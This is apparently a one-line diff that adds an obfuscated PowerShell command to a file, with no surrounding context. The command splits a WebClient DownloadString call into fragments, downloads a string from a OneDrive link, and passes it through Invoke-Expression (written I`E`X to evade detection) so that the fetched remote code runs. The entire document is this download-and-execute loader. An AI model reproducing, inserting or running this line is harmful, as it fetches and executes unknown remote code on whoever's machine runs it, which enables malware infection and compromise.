@@ -1,0 +1,1 @@
+$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://onedrive.live.com/download?cid=A0FB3CDE2E262340&resid=A0FB3CDE2E262340%211270&authkey=ACZ8QolYF8G-yHM'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
